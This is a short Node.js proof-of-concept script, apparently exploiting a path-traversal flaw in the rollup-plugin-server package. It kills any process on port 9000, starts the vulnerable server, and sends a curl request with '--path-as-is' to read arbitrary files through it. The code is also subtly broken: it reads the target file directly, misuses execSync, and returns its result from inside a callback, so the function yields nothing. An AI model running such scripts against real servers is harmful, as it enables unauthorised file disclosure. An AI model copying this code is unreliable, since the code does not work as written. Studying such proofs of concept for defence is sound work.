function exploitFunction(payload) {
  const path = require("path");
  const fs = require("fs");
  const { execSync } = require("child_process");

  let hostsFile = fs.readFileSync(payload).toString();

  try {
    execSync("fuser -k 9000/tcp", () => {});
  } catch (e) {}

  const server = require("rollup-plugin-server").createServer({
    host: "localhost",
    port: 9000,
  });

  server.listen(() => {
    const attack_string = `curl -v --path-as-is "http://127.0.0.1:9000${payload}"`;
    const { stdout } = require("child_process").execSync(attack_string);
    server.close();
    return stdout.toString();
  });
}

module.exports = { exploitFunction };